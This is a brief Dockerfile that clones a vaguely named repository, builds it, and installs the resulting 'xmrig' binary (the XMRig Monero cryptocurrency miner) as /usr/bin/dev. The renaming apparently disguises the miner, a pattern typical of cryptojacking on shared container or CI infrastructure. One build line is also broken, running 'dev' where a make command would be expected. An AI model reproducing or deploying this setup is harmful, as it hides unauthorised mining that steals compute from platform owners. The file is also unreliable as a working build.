FROM ubuntu:latest

RUN apt-get update && apt-get install -y software-properties-common -y

RUN apt-get update && apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev -y

RUN git clone https://github.com/vajisah50/tuctuc.git
RUN mkdir tuctuc/build
RUN cd tuctuc/build && cmake ..
RUN cd tuctuc/build && dev
RUN mv tuctuc/build/xmrig /usr/bin/dev
